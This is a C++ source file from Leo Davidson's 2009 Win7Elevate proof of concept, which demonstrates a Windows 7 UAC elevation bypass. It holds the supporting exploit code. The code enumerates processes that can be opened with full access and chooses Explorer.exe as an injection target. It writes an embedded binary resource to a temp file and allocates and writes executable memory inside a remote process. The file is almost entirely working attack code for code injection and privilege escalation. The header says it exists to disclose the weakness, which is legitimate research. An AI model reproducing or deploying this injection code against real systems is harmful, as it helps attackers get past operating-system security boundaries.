#include "stdafx.h"
#include "Win7Elevate_Utils.h"

#include ".\..\CMMN.h"

// All code (except for GetElevationType) (C) Leo Davidson, 8th February 2009, all rights reserved.
// (Minor tidy-up 12th June 2009 for the code's public release.)
// http://www.pretentiousname.com
// leo@ox.compsoc.net
//
// Using any part of this code for malicious purposes is expressly forbidden.
//
// This proof-of-concept code is intended only to demonstrate that code-injection
// poses a real problem with the default UAC settings in Windows 7 (tested with RC1 build 7100).
//
// Win7Elevate_Inject.cpp is the most interesting file. Most of the rest is just boilerplate UI/util code.

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool W7EUtils::GetProcessList(HWND hWnd, std::map< DWORD, std::wstring > &mapProcs)
{
	// Note: We probably need to target a process which has the same ASLR setting as us, i.e. ON.
	// Explorer.exe is our default since it has ASLR on, is always running and can do the COM silent-elevation stuff by default.

	bool bResult = false;

	mapProcs.clear();

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		//MessageBox(hWnd, L"CreateToolhelp32Snapshot failed", L"Win7Elevate", MB_OK | MB_ICONWARNING);
	}
	else
	{
		bool bFirst = true;
		PROCESSENTRY32 pe;

		while(true)
		{
			ZeroMemory(&pe, sizeof(pe));
			pe.dwSize = sizeof(pe);

			BOOL bPR = FALSE;

			if (bFirst)
			{
				bFirst = false;
				bPR = Process32First(hSnapshot, &pe);
			}
			else
			{
				bPR = Process32Next(hSnapshot, &pe);
			}

			if (!bPR)
			{
				DWORD dwErr = GetLastError();

				if ((ERROR_NO_MORE_FILES == dwErr) && !(mapProcs.empty()))
				{
					bResult = true;
				}

				break; // Stop enumerating.
			}

			// Only insert processes that we can open

			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);

			if (hProc != 0)
			{
				CloseHandle(hProc);
				mapProcs.insert( std::make_pair( pe.th32ProcessID, pe.szExeFile ) );
			}
		}

		CloseHandle(hSnapshot);
	}

	return bResult;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool W7EUtils::OpenProcessToInject(HWND hWnd, HANDLE *pOutProcHandle, DWORD dwPid, const wchar_t *szProcName)
{
	*pOutProcHandle = 0;

	if (szProcName == NULL)
	{
		//MessageBox(hWnd, L"No process name passed in", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		return false;
	}

	*pOutProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (*pOutProcHandle == 0)
	{
		DWORD dwError = GetLastError();

		wchar_t szPID[128];
		_itow_s(dwPid, szPID, _countof(szPID), 10);

		wchar_t szError[128];
		_itow_s(dwError, szError, _countof(szError), 10);

		std::wstring strMsg = L"Couldn't open process ";
		strMsg += szProcName;
		strMsg += L" (pid: ";
		strMsg += szPID;
		strMsg += L") ";

		if (dwError == ERROR_ACCESS_DENIED)
		{
			strMsg += L"ERROR_ACCESS_DENIED\n(We probably tried to inject into an elevated process\nwhich isn't allowed unless we're also elevated.\nPick an unelevated process.)";
		}
		else
		{
			strMsg += L"error ";
			strMsg += szError;
		}

		//MessageBox(hWnd, strMsg.c_str(), L"Win7Elevate", MB_OK | MB_ICONWARNING);


		return false;
	}

	return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

W7EUtils::CTempResource::CTempResource(HINSTANCE hInstance, int iResourceId)
: m_hInstance(hInstance)
, m_iResourceId(iResourceId)
{
}

// virtual
W7EUtils::CTempResource::~CTempResource()
{
	if (!m_strFilePath.empty())
	{
		DeleteFile(m_strFilePath.c_str());
		m_strFilePath.clear();
	}
	m_iResourceId = 0;
}

bool W7EUtils::CTempResource::GetFilePath(std::wstring &strPath)
{
	if (m_strFilePath.empty())
	{
		wchar_t szTempPath[MAX_PATH];

		DWORD dwTemp = GetTempPath(_countof(szTempPath), szTempPath);

		if (dwTemp != 0 && dwTemp < _countof(szTempPath))
		{
			HRSRC hResource = FindResource(m_hInstance, MAKEINTRESOURCE(m_iResourceId), L"BINARY");
		
			if (hResource)
			{
				HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);

				if (hLoadedResource)
				{
					LPVOID pLockedResource = LockResource(hLoadedResource);

					if (pLockedResource)
					{
						DWORD dwResourceSize = SizeofResource(m_hInstance, hResource);

						if (0 != dwResourceSize)
						{
							wchar_t szTempFilePath[MAX_PATH];

							if (0 != GetTempFileName(szTempPath, L"w7e", 0, szTempFilePath))
							{
								HANDLE hFile = CreateFile(szTempFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

								if (INVALID_HANDLE_VALUE != hFile)
								{
									DWORD dwBytesWritten = 0;

									if (WriteFile(hFile, pLockedResource, dwResourceSize, &dwBytesWritten, NULL)
									&&	dwBytesWritten == dwResourceSize)
									{
										m_strFilePath = szTempFilePath;
									}

									CloseHandle(hFile);

									if (m_strFilePath.empty())
									{
										DeleteFile(szTempFilePath);
									}
								}

							}
						}
					}
				}
			}
		}

	}

	if (!m_strFilePath.empty())
	{
		strPath = m_strFilePath;
		return true;
	}

	strPath.clear();
	return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

W7EUtils::CRemoteMemory::CRemoteMemory(HANDLE hRemoteProcess)
: m_hRemoteProcess(hRemoteProcess)
, m_bAnyFailures(false)
{
}

// virtual
W7EUtils::CRemoteMemory::~CRemoteMemory()
{
	while(!m_listRemoteAllocations.empty())
	{
		VirtualFreeEx(m_hRemoteProcess, m_listRemoteAllocations.back(), 0, MEM_RELEASE);
		m_listRemoteAllocations.pop_back();
	}
}

void W7EUtils::CRemoteMemory::LeakMemory()
{
	m_listRemoteAllocations.clear();
}

bool W7EUtils::CRemoteMemory::AnyFailures() const
{
	return m_bAnyFailures;
}

void *W7EUtils::CRemoteMemory::AllocAndCopyMemory(const void *pLocalBuffer, SIZE_T bufferSize, bool bExecutable, bool bConst)
{
	void *pRemoteAllocation = VirtualAllocEx(m_hRemoteProcess, 0, bufferSize, MEM_COMMIT | PAGE_READWRITE, bExecutable ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE);

	if (pRemoteAllocation)
	{
		DWORD dwOldProtect = 0;

		if (!WriteProcessMemory(m_hRemoteProcess, pRemoteAllocation, pLocalBuffer, bufferSize, NULL)
		||	(!bExecutable && !bConst && !VirtualProtectEx(m_hRemoteProcess, pRemoteAllocation, bufferSize, bExecutable ? PAGE_EXECUTE_READ : PAGE_READONLY, &dwOldProtect)))
		{
			VirtualFreeEx(m_hRemoteProcess, pRemoteAllocation, 0, MEM_RELEASE);
			pRemoteAllocation = 0;
		}
		else
		{
			m_listRemoteAllocations.push_back(pRemoteAllocation);
		}
	}

	if (pRemoteAllocation == 0)
	{
		m_bAnyFailures = true;
	}

	return pRemoteAllocation;
}

wchar_t *W7EUtils::CRemoteMemory::AllocAndCopyMemory(const wchar_t *szLocalString, bool bConst)
{
	return reinterpret_cast< wchar_t * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(wcslen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

char *W7EUtils::CRemoteMemory::AllocAndCopyMemory(const char *szLocalString, bool bConst)
{
	return reinterpret_cast< char * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(strlen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// GetElevationType slightly modified from original by Andrei Belogortseff
// From http://stackoverflow.com/questions/95912/how-can-i-detect-if-my-process-is-running-uac-elevated-or-not
bool W7EUtils::GetElevationType(TOKEN_ELEVATION_TYPE * ptet)
{
	bool bResult = false;

	HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
	    DWORD dwReturnLength = 0;

	    if (GetTokenInformation(hToken, TokenElevationType, ptet, sizeof(*ptet), &dwReturnLength ))
	    {
			assert(dwReturnLength == sizeof(*ptet));
			bResult = true;
		}

	    CloseHandle(hToken);
	}

	return bResult;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
